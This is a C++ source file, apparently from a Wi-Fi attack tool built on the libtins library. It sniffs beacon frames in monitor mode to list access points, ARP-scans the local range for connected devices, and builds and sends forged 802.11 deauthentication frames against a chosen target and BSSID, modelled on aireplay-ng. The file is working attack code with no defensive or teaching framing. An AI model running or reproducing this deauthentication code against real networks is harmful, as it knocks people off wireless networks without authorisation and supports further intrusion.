#include <iostream>
#include <codecvt>
#include <zconf.h>
#include <thread>
#include <boost/algorithm/string.hpp>
#include "network.hpp"

using namespace Tins;

network::network()	{
	iface_name = "wlan0";
	deauth_packet = Dot11Deauthentication(target, bssid);	//set target/sender
	deauth_packet.addr3(bssid);	//set the BSSID
	deauth_packet.reason_code(0x007);	//From airplay-ng
	radio = RadioTap() / deauth_packet;
}

network::~network()	{
}

std::vector<std::string> network::get_connected_devices()	{
	std::vector<std::string> targets;
	NetworkInterface iface = NetworkInterface(iface_name);
	NetworkInterface::Info info_scanner = iface.info();

	for(const auto &target : network_range)	{
		EthernetII scan = ARP::make_arp_request(target, info_scanner.ip_addr, info_scanner.hw_addr);
		std::unique_ptr<PDU> reply(sender.send_recv(scan, iface));
		if(reply)	{
			targets.push_back((reply->rfind_pdu<ARP>()).sender_hw_addr().to_string());
			std::cout << "Target found : [" << target << " / " << targets.back() << " ]" << std::endl;
		}
	}

	return targets;
}

std::vector<std::wstring> network::get_interfaces()	{
	std::vector<std::wstring> interface_names;
	std::vector<NetworkInterface> interfaces = NetworkInterface::all();
	for(const NetworkInterface& iface : interfaces)	{
		interface_names.push_back(iface.friendly_name());
	}

	return interface_names;
}

void network::send_deauth()	{
	sender.send(radio, iface_name);
}

std::map<std::string, std::set<Dot11::address_type> > network::get_access_points()	{
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	config.set_filter("type mgt subtype beacon");
	config.set_rfmon(true);

	Sniffer sniffer(iface_name, config);
	std::thread scanThread(&network::stop_scan, &scanning);
	scanThread.detach();

	sniffer.sniff_loop(make_sniffer_handler(this, &network::scan_callback));

	return access_points;
}

void network::stop_scan(bool *scanning)	{
	sleep(5);
	*scanning = false;
}

bool network::scan_callback(PDU &pdu)	{
	const Dot11Beacon& beacon = pdu.rfind_pdu<Dot11Beacon>();
	if (!beacon.from_ds() && !beacon.to_ds()) {
		address_type addr = beacon.addr2();
		ssids_type::iterator it = ssids.find(addr);
		if (it == ssids.end()) {
            try {
				std::string ssid = beacon.ssid();
				ssids.insert(addr);
				if(!ssid.empty()) {
					if(access_points.count(ssid)) {
						std::set<Dot11::address_type> addresses = access_points[ssid];
						addresses.insert(addr);
						access_points[ssid] = addresses;
					}
					else	{
						std::set<Dot11::address_type> address;
						address.insert(addr);
						access_points.insert(std::make_pair(ssid, address));
					}
				}
			}
			catch (std::runtime_error&) {}
		}
	}
	return scanning;
}

void network::set_interface(std::string interface)	{
	iface_name = interface;
}

void network::set_bssid(const std::string hw_addr)	{
	bssid = HWAddress<6>(hw_addr);
}

std::string network::get_bssid()	{
	return bssid.to_string();
}